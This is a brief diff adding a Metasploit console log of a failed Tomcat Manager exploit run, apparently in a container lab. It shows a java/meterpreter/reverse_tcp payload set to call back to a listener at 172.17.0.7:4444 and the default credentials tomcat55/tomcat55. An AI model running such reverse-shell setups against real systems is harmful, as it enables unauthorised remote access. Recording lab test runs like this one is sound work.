@@ -1,0 +1,11 @@
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+RHOSTS => 172.17.0.6
+RPORT => 80
+HttpUsername => tomcat55
+HttpPassword => tomcat55
+LHOST => 172.17.0.7
+LPORT => 4444
+[*] Started reverse TCP handler on 172.17.0.7:4444 
+[*] Retrieving session ID and CSRF token...
+[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
+[*] Exploit completed, but no session was created.
